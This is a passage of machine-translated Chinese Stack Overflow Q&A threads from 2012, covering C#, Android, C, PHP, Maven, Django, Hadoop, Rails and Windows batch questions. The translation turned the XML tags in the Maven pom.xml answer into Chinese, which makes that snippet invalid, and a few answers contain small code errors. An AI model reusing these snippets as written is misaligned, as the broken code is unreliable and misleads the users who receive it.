但是从长远来看，n^2 算法的影响比 2*n 算法大得多。随着 n 越来越大，n^2 和 2*n 之间的差异也越来越大。

因此，要回答您的问题，是的，当程序运行速度减慢两倍时，这很重要。但是，如果它以指数速度变慢，那就更重要了。这就是我们关心 Big-Oh 的原因。但是对速度的任何改进显然对您的程序都有好处。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-25T03:41:25.317

当随着 n 的增长将 O(n) 与 O(n^2) 进行比较时，常数将开始变得无关紧要。即使常数很大，这也应该很明显。

之所以没有提到常量，是因为复杂度的顺序更重要。一旦您知道算法是线性时间，您就可以在计算细节时自己检查斜率。

当您有两个程序时，O(n) 常量将决定哪个更好。然后你必须更详细地分析算法。

# algorithm - 简单的尼姆游戏

> ID：13061171
> 
> 赞同：0
> 
> 时间：2012-10-25T03:34:47.150
> 
> 标签：algorithm, game-theory

最近学习了元素堆的 Nim 游戏的基本策略。然后必须选择一堆并从该堆中删除任意数量的元素。我发现了一些据说是 Nim 的问题，但我无法将其转换为代表堆的标准 Nim 问题。

问题说有一个像国际象棋一样的方形棋盘 - 这里只有典当。所以在每一列中都有两个棋子 - 一个白色的和一个黑色的。没有棋子可以超越它，但它可以来回移动，这与国际象棋不同，棋子只能向前移动。他们不能像国际象棋那样通过吃掉对手的棋子来改变列。当任何一方没有选择让步时，游戏结束。给定棋子的初始配置，程序需要输出获胜者 - 白/黑。

关于如何将其转换为标准的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T07:51:49.300

请注意，每一步都会改变相应棋子之间距离总和的奇偶性。计算奇偶性，当前玩家获胜IFF总和是奇数（因为如果它是奇数当前玩家总是可以向前移动棋子）

# c# - 可以在 Visual Studio 中使用 WSDL 自动生成代码

> ID：13061172
> 
> 赞同：6
> 
> 时间：2012-10-25T03:34:46.473
> 
> 标签：c#, visual-studio-2010, web-services

您好我希望使用测试以下功能： http://msrmaps.com/terraservice2.asmx?op= [ConvertLonLatPtToNearestPlace](http://msrmaps.com/terraservice2.asmx?op=ConvertLonLatPtToNearestPlace)

有没有更快的方法可以使用 Visual Studio 2010 对其进行测试？我通常使用 C#。我只是想知道是否可以输入 wsdl，并让 Visual Studio 自动生成一些代码来调用该服务？谢谢。

顺便说一句，“测试表单仅适用于来自本地计算机的请求”是什么意思。在网址中？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-25T05:23:00.280

您可以执行一些操作来生成该代码。第一种也是最简单的方法（在我看来）是创建对该 URL 的服务引用。以下是一些截图：

右键单击您的项目，添加服务引用：

![右键单击项目并选择添加服务引用](../Images/5c7622320b5d2cfc0fec6434fe4b5de5.png)

输入 asmx 的 URL（在查询字符串中没有方法），为引用命名并单击 OK：

![输入服务的 URL](../Images/9ec31b38268e280c8b3800c469d7fb08.png)

这将生成您拨打电话所需的代理代码：

![注意项目中的新服务引用](../Images/98425b6c0d0cb12a47ca971f2a909269.png)

从那里，您可以使用该代理代码来调用 Web 服务：

```
TerraService.TerraServiceSoapClient client = new TerraService
    .TerraServiceSoapClient("TerraServiceSoap");
string place = client.ConvertLonLatPtToNearestPlace(
    new TerraService.LonLatPt { Lat = 47.6532, Lon = -122.135479 }); 
```

第二种方法是使用`WSDL.exe`Visual Studio自带的命令行工具。启动 Visual Studio 命令提示符并键入`wsdl /?`. 这将向您显示应用程序的参数。就我而言，我只是从[http://msrmaps.com/terraservice2.asmx?wsdl](http://msrmaps.com/terraservice2.asmx?wsdl)下载了一份 WSDL 副本，将其保存到我的桌面并运行以下命令：

```
wsdl /o:./terraservice.cs terraservice.wsdl 
```

在我的 WSDL 文件旁边生成代理类。

最后一件事......就像@Habibillah 建议的那样，与soapUI 成为最好的朋友。这是一个无需编写任何代码即可调用 Web 服务的绝佳工具。

希望有帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T03:51:42.970

Visual Studio 可以为 URL 引用的 wsdl/webservice 生成代码，即使它位于本地计算机之外。但是，浏览器访问的测试表单只能在本地机器（localhost）上访问。

[但是您仍然可以通过其他工具（例如soapUI](http://www.soapui.org/) ）在 Internet 上测试 Web 服务。这个工具对我在互联网上测试 web 服务很有用。

# c++ - 识别显卡是内置还是外置c++

> ID：13061173
> 
> 赞同：0
> 
> 时间：2012-10-25T03:35:07.083
> 
> 标签：c++, opengl

我想知道有没有办法从代码中识别我们机器中使用的显卡是外部的还是内置的？我正在使用 c++ 和 opengl。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T03:38:39.803

您可能想要获得支持的扩展？存在一个名为 GLEW 的库，用于获取支持的扩展。请参阅[使用 GLEW 在 Windows 下使用 OpenGL 扩展](https://stackoverflow.com/questions/17370/using-glew-to-use-opengl-extensions-under-windows)

另一种方法是执行特定于操作系统的设备查询。（所以在我们走那条路之前你需要给我们一个操作系统）

# android - 只有创建视图层次结构的原始线程才能接触其视图

> ID：13061174
> 
> 赞同：3
> 
> 时间：2012-10-25T03:35:10.120
> 
> 标签：android

我正在尝试为我的应用程序构建启动画面。当我尝试更改我的 imagesview 属性并设置动画时，我收到一个错误。

我已经测试了 runonuithread 和 Hadler，但是在这 2 种情况下，没有错误，屏幕上也没有显示任何内容，并且在延迟（正是我在代码中指定的内容）之后，程序活动切换到下一个活动，这是我的代码：

```
@Override
public void run(){
    try {
            TranslateAnimation moveLefttoRight = new TranslateAnimation(500, 0, 0, 0);
            moveLefttoRight.setDuration(5000);
            moveLefttoRight.setFillAfter(true);
            im.startAnimation(moveLefttoRight);//im is an image view
            SystemClock.sleep(6000);
            TranslateAnimation moveRighttoLeft = new TranslateAnimation(0, 100, 0, 0);
            moveRighttoLeft.setDuration(1000);
            moveRighttoLeft.setFillAfter(true);
            im.startAnimation(moveRighttoLeft);
            SystemClock.sleep(6000);
            ScaleAnimation scale = new ScaleAnimation(0.3f, 1f, 0.3f, 1f, 
                    ScaleAnimation.RELATIVE_TO_SELF, 0f, 
                    ScaleAnimation.RELATIVE_TO_SELF, 0f);
            scale.setDuration(1000);
            scale.setFillAfter(true);
            // Wait given period of time or exit on touch

            sig.startAnimation(scale);//sig is an image view

            SystemClock.sleep(2000);

    } 
```

我该如何解决这个奇怪的错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:35:14.297

我试过你的代码，没有问题。当您更改任何视图时，您必须在 UI/主线程上进行。你可以试试我编辑的代码：

```
TranslateAnimation moveLefttoRight = new TranslateAnimation(500, 0, 0,
        0);
moveLefttoRight.setDuration(5000);
moveLefttoRight.setFillAfter(true);
bt1.startAnimation(moveLefttoRight);// im is an image view

moveLefttoRight.setAnimationListener(new AnimationListener() {

    @Override
    public void onAnimationStart(Animation animation) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onAnimationRepeat(Animation animation) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onAnimationEnd(Animation animation) {
        doAnim2(); // do the next animation
    }
}); 
```

# c - C程序字符串乱七八糟

> ID：13061175
> 
> 赞同：2
> 
> 时间：2012-10-25T03:35:26.427
> 
> 标签：c, string

```
for (i = 0; i < size; i++) {
if((string[i] >= 65 && string[i] <= 90) || (string[i] >= 97 && string[i] <= 122) || string[i] == 10) {
    sec_str[j] = tolower(string[i]);
    putchar(sec_str[j]);
    j++;
}
}
printf("%s\n", sec_str); 
```

这是我的代码，试图将一个字符串复制到另一个字符串，剥离所有非字母大小写，这对我来说很好，我使用 putchar(sec_str[j]) 进行检查，它们都很好，但是当我检查时printf("%s", sec_str)，输出一团糟。像这样的东西：

```
asantaspotstopsatnasa
asantaspotstopsatnasa

twasbrilligandtheslithytoves
twasbrilligandtheslithytoves
����r�$
yobananaboy
yobananaboy
ndth
neveroddoreven
neveroddoreven
h
thetimehascomethewalrussaid
thetimehascomethewalrussaid
����t�r�$ 
```

并且 printf 应该打印

```
asantaspotstopsatnasa
twasbrilligandtheslithytoves
yobananaboy
neveroddoreven
thetimehascomethewalrussaid 
```

要正确

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T03:36:18.050

您忘记在字符串末尾添加空终止符:)

```
#include <stdio.h>
#include <ctype.h>
...
  for (i = 0; i < size; i++) {
    if(ischar(string[i]) ||  (string[i] == 10) ) {
      sec_str[j] = tolower(string[i]);
      putchar(sec_str[j]);
      j++;
    }
  }
  sec_string[j] = '\0';
  printf("%s\n", sec_str); 
```

# php - 多个提要合并为一个提要

> ID：13061180
> 
> 赞同：0
> 
> 时间：2012-10-25T03:36:16.860
> 
> 标签：php, xml, rss, xml-parsing

有没有办法将多个 xml 提要放入一个 xml 提要并按发布日期排序？

xml 提要来自不同的网站，我想创建另一个 xml 来放置每个 xml 提要的所有内容。

问题是解析所有 xml 提要的加载时间。我有 8 个网站供稿要解析。另一个问题是如何按发布日期排列它们。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T03:48:54.830

您需要创建一个临时数组并获取其中的所有提要。然后按日期对数组进行排序并显示。要从一个提要中获取项目，您可以使用 magpierss 遍历所有项目。

下面是一个如何使用 magpie rss 的示例。参考： http: [//magpierss.sourceforge.net/](http://magpierss.sourceforge.net/)

```
require_once 'rss_fetch.inc';

$url = 'http://magpie.sf.net/samples/imc.1-0.rdf';
$rss = fetch_rss($url);

    $tempArray = array();
foreach ($rss->items as $item ) {
    $tempArray[]['title'] = $item['title'];
    $tempArray[]['url']   = $item['link'];
    $tempArray[]['date'] = $item['pubDate'];

    } 
```

在上面的示例中，$tempArray 将包含一个提要的所有项目。同样，您需要将其他提要的其他项目放入其中。然后使用uasort按日期排序。

# xcode - 从图像映射加载 UIImage

> ID：13061183
> 
> 赞同：0
> 
> 时间：2012-10-25T03:37:19.237
> 
> 标签：xcode, cocoa-touch, ios5, ios6

我知道这听起来像是一项非常基本的任务，但我尝试过搜索等但没有结果

例如，这是我正在尝试做的一个例子

加载图像

![图像映射](../Images/0ec1cbd2abeddd4582801fefe6052e05.png)

成图像映射成 UIImage

从 x,y 请求具有宽度和高度的图像。

例如：

```
-(UIImage *) loadImgFromImageMap:(UIImage *)map withRect:(CGRect)dimensions; 
```

只是作为一个例子。例如，如果我将 {64, 0, 64, 64} 作为矩形传递，那么结果将是：

![UIImage 结果](../Images/f5e93ca23cb411dce655c8ee307952fe.png)

有什么建议么？:)

问候

蒂姆·埃利斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:52:04.960

当然，一旦您发布，您会在其他地方找到答案......

对于那些寻找的人，我在这里找到了

[裁剪 UIImage](https://stackoverflow.com/questions/158914/cropping-a-uiimage)

我使用的代码基本相同，但我将其添加到 UIImage 以使事情变得简单

这里是给有兴趣的人

```
//The .h file
@interface UIImage (crop)
- (UIImage *)crop:(CGRect)rect;
@end 
```

主文件

```
//The .m file
@implementation UIImage (crop)

- (UIImage *)crop:(CGRect)rect {
    if (self.scale > 1.0f) {
        rect = CGRectMake(rect.origin.x * self.scale,
                          rect.origin.y * self.scale,
                          rect.size.width * self.scale,
                          rect.size.height * self.scale);
    }

    CGImageRef imageRef = CGImageCreateWithImageInRect(self.CGImage, rect);
    UIImage *result = [UIImage imageWithCGImage:imageRef scale:self.scale orientation:self.imageOrientation];
    CGImageRelease(imageRef);
    return result;
}

@end 
```

现在调用它很容易。

这是一个示例:)

```
UIImage *image = [UIImage imageNamed:@"imgMap.png"];
CGRect frame = CGRectMake (0, 0, 40, 40); //Change this to whatever the frame should be
UIImage *cropped = [image crop:frame]; 
```

# java - 分布式缓存和性能 Hadoop

> ID：13061187
> 
> 赞同：2
> 
> 时间：2012-10-25T03:38:17.497
> 
> 标签：java, hadoop, mapreduce, distributed-caching

我想让我对 hadoop 分布式缓存的理解清楚。我知道当我们将文件添加到分布式缓存时，文件会加载到集群中每个节点的磁盘上。

那么文件的数据如何传输到集群中的所有节点。是通过网络吗？如果是这样，它不会对网络造成压力吗？

我有以下想法，对吗？

如果文件很大，会不会出现网络拥塞？

如果节点数量多，即使文件是中小文件，文件的复制和传输到所有节点，会不会造成网络拥塞和内存限制？

请帮助我理解这些概念。

谢谢！！！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T03:54:24.473

1.  是的，文件是通过网络传输的，通常是通过 HDFS。与将 HDFS 用于任何非数据本地任务相比，它不会对网络造成更大的压力。

2.  如果文件很大，则可能会出现网络拥塞，但是您已经将 jar 推送到所有这些任务跟踪器，因此只要您的文件不比 jar 大太多，您的开销不应该是太糟糕了。

3.  文件的复制与最终会提取该文件的任务跟踪器的数量完全分开。复制也将从一个节点链接到另一个节点，并且无论如何都是拥有容错分布式文件系统的成本。同样，假设分布式缓存中的文件与您的 jar 具有相同的大小，网络拥塞并不比将您的 jar 推送到所有任务跟踪器更成问题。

总的来说，分布式缓存的开销是微不足道的，只要它按预期使用，作为一种将相当小的缓存数据推送到执行计算的任务跟踪器的本地方式。

编辑：这是 0.20 的[DistributedCache](http://hadoop.apache.org/docs/r0.20.2/api/org/apache/hadoop/filecache/DistributedCache.htm)文档。请注意，这些文件是通过 url 指定的。通常你会在你的本地 hdfs:// 设置中使用一些东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T03:50:14.767

我认为您对分布式缓存的理解是正确的。因为我也这么认为:) 也许增加分布式缓存的复制可以减少网络传输

# java - Maven 与“分类器”标签一起使用时生成两个 jar 文件

> ID：13061193
> 
> 赞同：3
> 
> 时间：2012-10-25T03:39:11.927
> 
> 标签：java, maven, build

我的项目要求我获取开源代码，对其进行调整并将其用作依赖项。当我构建它时，我想附加一个分类器（以便区分修改后的代码和原始代码）。以下是 pom.xml 的片段形式。

```
<plugins>
    <plugin>
        <artifactId>maven-jar-plugin</artifactId>
        <executions>
            <execution>
                <id>gc-custom</id>
                <goals>
                    <goal>jar</goal>
                </goals>

                <configuration>
                    <classifier>gc</classifier>
                </configuration>
            </execution>
        </executions>
    </plugin>
</plugins> 
```

我的问题是，在我启动构建后，maven 正在生成两个 jar 文件（附加和不附加分类器），即输出包含 2 个名为“atlassian-pageobjects-api-2.1-m14.jar”、“atlassian-pageobjects-api-”的 jar 文件2.1-m14-gc.jar”。

我正在使用以下命令来构建：

mvn 干净安装

请帮忙，让我知道这里出了什么问题。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T04:36:01.217

查看文档，似乎分类器用于生成额外的 jar。

见[这里](http://maven.apache.org/plugins/maven-jar-plugin/usage.html)：

> 通过添加 / 或 / 指定要包含或排除的文件集模式列表，并在 pom.xml 中添加分类器。
> 
> **注意：** jar-plugin 必须在新的执行中定义，否则它将替换 jar-plugin 的默认使用，而不是添加第二个工件。分类器还需要创建多个工件。

因此，根据文档，听起来好像您不提供`<id>`执行它将覆盖默认的 jar 机制并为您提供一个带有`-gc.jar`附录的 jar。但*事实并非如此。*你总是得到两个罐子。

我已经破解了一点，您可以使用*默认插件 id*覆盖默认设置。所以，这就是给我一个`-gc.jar`名字的单一罐子。

```
<构建>
  <插件>
    ...
    <插件>
        <artifactId>maven-jar-plugin</artifactId>
        <执行>
            <执行>
                <id>默认罐子</id>
                <阶段>包</阶段>
                <目标>
                    <目标>罐子</目标>
                </目标>
                <配置>
                    <分类器>gc</分类器>
                </配置>
            </执行>
        </执行>
    </插件>
  </插件>  
</build>

```

# django - Django Serializer AttributeError：“unicode”对象没有属性“isoformat”

> ID：13061198
> 
> 赞同：6
> 
> 时间：2012-10-25T03:39:24.220
> 
> 标签：django, django-serializer

我正在尝试序列化（自定义）Django用户模型的实例，如下所示：

在模型.py 中：

```
Class Employee(User):
    company = models.ForeignKey('Company')
    additionalField1
    additionalField2
    etc.... 
```

在上面的Employee模型中，除了继承自User模型的属性外，我还使用了以下模型字段类型：CharField()、NullBooleanField()、IntegerField()、DateField()、DecimalField()

有问题的代码：

```
employee = Employee()
(snip large amounts of code that sets various attributes for employee)
serializers.serialize("json", [employee, ]) 
```

（顺便说一句，我安装了 WadOfStuff 的 Django 完整序列化程序插件，以防万一——但在这种情况下，我认为它应该默认为标准 Django 序列化程序，因为在这种情况下我没有使用任何完整序列化程序的功能）

尝试序列化之前的员工 __dict__ （带有一些匿名的关键字段）：

```
{'status': u'Act', 'last_name': u'Doe', 'payFrequency': u'Mo', '_state':
 <django.db.models.base.ModelState object at 0x15be890>, 'sex': u'M', 'user_ptr_id': 
None, 'is_staff': False, 'isRegistered': False, 'hireDate': u'2012-08-01', 'id': None, 
'date_joined': datetime.datetime(2012, 10, 25, 2, 39, 22, 793015, tzinfo=<UTC>), 
'city': u'San Francisco', 'first_name': u'John', 'zip': u'94114', u'employmentType': 
u'FT', 'company_id': 4, 'compType': u'S', 'is_superuser': False, 'state': u'CA', 
'last_login': datetime.datetime(2012, 10, 25, 2, 39, 22, 792983, tzinfo=<UTC>), 
'email': '', 'username': 'tu7wwhyskewcpheyoq4lk3i3l', 'address2': '', 'is_active': 
True, 'phone': '', 'address': u'111 Cherry Lane', 'password': 
'pbkdf2_sha256$10000$OAlOtfQClAV2$OC9oCe/9P5hjc4nWd1ZW6cY117PmW1pny8J41axr6mM=', 
'salary': u'10833.00', 'standardHours': None, 'dob': u'1980-04-01', 'socialSecurity': 
u'555555555', 'middleInitial': '', 'payRate': None} 
```

部分回溯：

```
File "/usr/lib/python2.6/site-packages/django/core/serializers/__init__.py", l                                                                                                                     ine 98, in serialize
s.serialize(queryset, **options)
File "/usr/lib/python2.6/site-packages/wadofstuff/django/serializers/base.py",                                                                                                                      line 52, in serialize
self.handle_field(obj, field)
File "/usr/lib/python2.6/site-packages/wadofstuff/django/serializers/python.py                                                                                                                     ", line 71, in handle_field
self._fields[field.name] = field.value_to_string(obj)
File "/usr/lib/python2.6/site-packages/django/db/models/fields/__init__.py", l                                                                                                                     ine 722, in value_to_string
return '' if val is None else val.isoformat()
AttributeError: 'unicode' object has no attribute 'isoformat' 
```

有什么想法可能导致错误或在这种情况下如何使序列化工作？大概有某种属性是 Serializer 不喜欢的——我怎样才能确定是哪一个？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-25T03:58:33.803

isoformat 是一种通常用于 datetime.datetime 或 datetime.date 对象的方法，看起来它正试图在字符串上执行此操作。

我怀疑“hireDate”或“dob”应该是对象日期/日期时间对象，但不是。根据回溯，您可以尝试将这些属性设置为 None 并查看是否再次遇到错误。或者，您应该尝试查看 Django 是否会将模型与您拥有的数据一起保存到数据库中。如果不是，那可能是导致您的问题的原因，在这种情况下，数据被放入具有错误类型的 Employee 对象中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-10-31T06:53:32.967

当从 DRF2.X 升级到 DRF3.X 时，这个问题可能会突然出现，就像我发生的那样。原因在[DRF 3.0 公告](http://www.django-rest-framework.org/topics/3.0-announcement/)中说明为向后不兼容的更改：

> 默认情况下，日期和时间对象在序列化器输出中被强制转换为字符串。以前它们作为 Date、Time 和 DateTime 对象返回，后来被渲染器强制转换为字符串。

修复它的方法是告诉它像以前一样运行（让序列化器返回对象表示并让渲染器将其转换为字符串）。公告页面中也指出了这两种方法。

1.  将应用程序全局添加到 REST_FRAMEWORK 部分下的 settings.py 中（以及您可能已经拥有的其他首选项）：

    ```
    # Return native `Date` and `Time` objects in `serializer.data`
    'DATETIME_FORMAT': None,
    'DATE_FORMAT': None,
    'TIME_FORMAT': None 
    ```

2.  单独用于序列化程序定义中的选择字段：

    created = serializers.DateTimeField(format=None)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-12-06T10:05:11.650

我遇到过类似的问题..

```
AttributeError: 'unicode' object has no attribute 'isoformat' 
```

直到一天前它都运行良好.. 一切正常的模型-> 字段数都是一样的.. 在我花了这么多时间之后，我发现了确切的错误..

就我而言，mysql表中的字段位置已更改...

例如：

在我的**models.py**

```
file_path = models.CharField(max_length=255, null=True, blank=True) 
```

位于第 39 行。当我检查 DB 时，DB 开发人员改变了它在表上的位置。我再次生成模型，解决了我的问题。

下面是我的代码的屏幕截图`git status`

[![错误](../Images/638abdc8bd4148805a3a0500960bb1b4.png)](https://i.stack.imgur.com/8zciP.png)

# c# - SHA256 哈希函数给出意外结果

> ID：13061200
> 
> 赞同：0
> 
> 时间：2012-10-25T03:39:46.363
> 
> 标签：c#, encryption, hash, sha256

我正在使用 C# 并想知道为什么 .Net 函数 PasswordDeriveBytes 返回与其他 SHA256 算法不同的结果。

我这样称呼它：

```
byte[] saltValueBytes = Encoding.ASCII.GetBytes(saltValue);
var hash = PasswordDeriveBytes("1234567890", saltValueBytes, "SHA256", 1);
byte[] SHA256Pass = hash.GetBytes(); 
```

我期待得到哈希 c775e7b757ede630cd0aa1113bd102661ab38829ca52a6422ab782862f268646

但是我得到 b????????A?n?z$?]??9,m^????@n?

我不知道问题是什么。这个函数是如何工作的以及为什么我得到的结果看起来不像 SHA 256 哈希。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T03:58:59.497

你如何显示你的字节？看起来你拿走了它们并试图将它们直接转换为字符串，这会给你一些看起来很奇怪的字符（大约是预期字符数的一半）。有关将转换为十六进制字符串的一些选项，请参阅[此答案](https://stackoverflow.com/questions/311165/how-do-you-convert-byte-array-to-hexadecimal-string-and-vice-versa-in-c)，就像您期望的那样。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T12:41:01.350

PasswordDeriveBytes 不是散列函数，它是密钥派生函数。它精确地遵循 PBKDF1，直到超过 20 字节的输出，PBKDF1 就是为此而设计的。当这种情况发生时，它会变成专有的、编程错误的、不安全的和未知的密钥延伸功能。

PBKDF1 使用 SHA-1 来实现密钥派生。SHA-256 是一种更安全的散列函数，具有更大的输出。因此，这两个函数永远不会有相同的输出。如果你愿意，你将打破两者之一 - 或者你更可能犯了错误。

请注意，您应该使用 PBKDF2 而不是 PBKDF1，因为它更安全并且确实提供了密钥拉伸。

# asp.net-mvc - 如何处理从业务层到表示层的名称冲突映射？

> ID：13061203
> 
> 赞同：1
> 
> 时间：2012-10-25T03:40:09.900
> 
> 标签：asp.net-mvc, model, naming-conventions, 3-tier

在 N 层应用程序中，我的网站连接到 Web 引用以访问业务层逻辑并获取业务层 DTO。例如，BL 可能会为 Car 提供定义：

```
public class Car() {
    public string Make { get; set; }
    public string Model { get; set; }
    . . .
} 
```

在我的 ASP.NET MVC 网站中，我需要创建自己的汽车模型对象。（可能添加/删除字段或通过数据注释添加验证）。

由于我的命名空间中已经有一个名为 Car 的对象，因此我需要将模型对象命名为其他名称。不过，该对象确实没有更好的名称。有没有更简单的方法来处理这些名称冲突？或者，我可以完全限定模型，但这似乎并不理想。

另一种可能性，我可以使用 BL 中的对象，但是扩展它以便我可以添加数据注释以进行验证？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:50:34.313

我见过人们`Model`在他们的 MVC 应用程序中处理这些类时只是简单地附加到这些类。在您的情况下，课程将是`CarModel`.

至于扩展对象，我不建议将业务层对象泄漏到表示层，因为如果数据发生变化，你以后会遇到麻烦。`Car`不必在使用数据的每个地方都更改表示代码，只需在从到的转换中更改它会更容易`CarModel`。

# .net - 如何将字节从缓冲区复制到托管结构中？

> ID：13061205
> 
> 赞同：0
> 
> 时间：2012-10-25T03:40:39.707
> 
> 标签：.net, visual-c++, c++-cli, managed-c++

我无法让代码**在托管**环境中工作（VS2008 C++/CLI Win Forms App）。问题是我**不能在托管**代码中声明非托管结构（这甚至可能吗？），所以我已经声明了一个托管结构，但现在我遇到了**如何将字节从缓冲区复制到该结构**的问题。这是显然可以按预期工作的纯 C++ 代码：

```
typedef struct GPS_point {
  float point_unknown_1;
  float latitude;
  float longitude;
  float altitude;            // x10000
  float time;
  int point_unknown_2;
  int speed;                 // x100
  int manually_logged_point; // flag (1 --> point logged manually)
  } track_point;

int offset           = 0;
int filesize         = 256;  // simulates filesize
int point_num        = 10;   // simulates number of records

int main () {

char *buffer_dyn = new char[filesize];  // allocate RAM
// here, the file would have been read into the buffer
buffer_dyn[0xa8] = 0x1e;  // simulates the speed data (1e 00 00 00)
buffer_dyn[0xa9] = 0x00;
buffer_dyn[0xaa] = 0x00;
buffer_dyn[0xab] = 0x00;

offset = 0x90;  // if the data with this offset is transfered trom buffer
                // to struct, int speed is alligned with the buffer at the
                // offset of 0xa8

track_point *points = new track_point[point_num];
points[0].speed    = 0xff;  // (debug) it should change into 0x1e
memcpy(&points[0],buffer_dyn+offset,32);

cout << "offset: " << offset << "\r\n";
//cout << "speed: " << points[0].speed << "\r\n";
printf ("speed : 0x%x\r\n",points[0].speed);
printf("byte at offset 0xa8: 0x%x\r\n",(unsigned char)buffer_dyn[0xa8]);  // should be 0x1e

delete[] buffer_dyn;  // release RAM
delete[] points;

/*
What I need is to rewrite the lines 29 and 31 to work in the managed code (VS2008 Win Forms C++/CLI)
What should I have after:

array<track_point^>^ points = gcnew array<track_point^>(point_num);

so I can copy 32 bytes from buffer_dyn to the managed struct declared as

typedef ref struct GPS_point {
  float point_unknown_1;
  float latitude;
  float longitude;
  float altitude;             // x10000
  float time;
  int point_unknown_2;
  int speed;                  // x100
  int manually_logged_point;  // flag (1 --> point logged manually)
  } track_point;
*/

return 0;
} 
```

这是[codepad.org的粘贴，](http://codepad.org/G2Hlg65S)因此可以看到代码是可以的。

**我需要的是重写这两行：**

```
track_point *points = new track_point[point_num];
memcpy(&points[0],buffer_dyn+offset,32); 
```

可以在托管应用程序中工作的东西。我写：

```
array<track_point^>^ points = gcnew array<track_point^>(point_num); 
```

现在我正在尝试通过结构从缓冲区复制所描述的数据复制，但不知道应该如何完成。

或者，**如果有一种方法可以**以我的代码中显示的相同方式使用非托管结构，那么我想避免使用托管结构。

# javascript - Rails 3.0 中的 Javascript 默认值

> ID：13061206
> 
> 赞同：1
> 
> 时间：2012-10-25T03:40:43.627
> 
> 标签：javascript, ruby-on-rails-3

在文件`application.html.erb`中，我看到了这一行

```
 <%= javascript_include_tag :defaults %> 
```

这里是什么`:defaults`意思？它包含哪些 Javascript 文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T03:45:15.350

> 要在您的应用程序中包含 Prototype 和 Scriptaculous javascript 库，请将`:defaults`其作为源传递。使用时`:defaults`，如果您的公共 javascripts 目录中存在 application.js 文件，它也会被包含在内。

[资源](http://apidock.com/rails/v3.0.9/ActionView/Helpers/AssetTagHelper/javascript_include_tag)

换句话说：

*   原型.js
*   控件.js
*   拖放.js
*   效果.js
*   *rails.js（这个没有在 API中*列出，但包含在内）
*   application.js（如果存在）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T03:51:18.390

在 Rails 3.0 中，`:defaults`选项**包括 Prototype.js/Scriptaculous 和您的 application.js**，尽管它比这更细微一些。在 Rails 3.2 中，改为加载**jQuery 。**`javascript_include_tag`以下是当前文档的摘录：

> 如果应用程序未使用资产管道，则包含默认的 JavaScript 扩展 pass :defaults 作为源。默认情况下，:defaults 加载 jQuery，并且可以在 config/application.rb 中覆盖：
> 
> ```
> config.action_view.javascript_expansions[:defaults] = %w(foo.js bar.js) 
> ```
> 
> 使用 :defaults 时，如果 application.js 文件存在于 public/javascripts 中，它也会被包含在最后。

[Rails 中](http://guides.rubyonrails.org/layouts_and_rendering.html)的布局和渲染指南有一个标题为[Linking to JavaScript files with 的部分`javascript_include_tag`](http://guides.rubyonrails.org/layouts_and_rendering.html#linking-to-javascript-files-with-the-javascript_include_tag)也涵盖了这种行为。

# windows - FIND 命令返回空值

> ID：13061208
> 
> 赞同：2
> 
> 时间：2012-10-25T03:40:45.593
> 
> 标签：windows, batch-file, null, cmd

在运行确定一组 ping 的平均延迟的批处理时，我遇到了一个不寻常的问题。在将 ping 传送到 FIND 命令时，如果在 ping 中找不到要搜索的字符串，则 FOR 循环不会执行 DO 部分，而是跳到下一次迭代。

以这个命令为例：

```
FOR /F "tokens=*" %X in ('ping 8.8.8.8 -n 1 -w 1000^|FIND "Average"') do echo Result: %X 
```

如果你把它扔进命令行，你会得到预期的结果：

```
Result: Minimum = 23ms, Maximum = 23ms, Average = 23ms 
```

对于失败的 ping，我希望看到： 结果：

相反，结果为空。你可以通过在那里扔一个死IP来尝试这个。

```
FOR /F "tokens=*" %X in ('ping 1.1.1.1 -n 1 -w 1000^|FIND "Average"') do echo Result: %X 
```

在命令从文本文件中迭代 IP 地址的批处理脚本中使用它时，这会给我带来各种破坏。

例如，我有 ip.txt，其中包含 {8.8.8.8,8.8.4.4,1.1.1.1}。当批处理文件循环运行时，我希望输出为：

```
8.8.8.8 - 23ms
8.8.8.8 - 36ms
1.1.1.1 - 
8.8.8.8 - 20ms
8.8.8.8 - 18ms
1.1.1.1 - 
```

相反，我得到：

```
8.8.8.8 - 23ms
8.8.8.8 - 36ms
8.8.8.8 - 20ms
8.8.8.8 - 18ms 
```

FIND 返回的没有值的行会忽略 DO 阶段，而是立即迭代。

我从未见过 FOR 循环忽略 DO 阶段并在之前的任何情况下继续迭代。任何解决方法，甚至只是解释为什么会发生这种情况都会很棒。

谢谢！

EDIT1：哈里·约翰斯顿

感谢您的快速回复。不幸的是，据我所知，这个问题无法在 FOR 循环之外解决。

这适用于单个 IP 示例，但不适用于迭代的多个值。问题是，如前所述，您的示例在所有迭代后只会返回一行，而该行将是最后一次迭代的值。

这更接近正在运行的实际代码。创建一个文本文件名 ip.txt 并用 IP 地址列表填充它，每行一个。

测试.bat

```
@echo off
cls
if not exist [logs] md [logs]
FOR /F "eol=;" %%i in (ip.txt) do for /f "tokens=9" %%p in ('ping %%i -n 3 -w 1000 ^|FIND "Average"') do echo Result - %%p 
pause 
```

ip.txt

```
8.8.8.8
1.1.1.1
8.8.4.4 
```

使用您的解决方案，这只会回显 [8.8.4.4] 的 ping 结果。因为它将返回第一个和第三个结果，完成跳过第二个。

EDIT2：德本汉姆

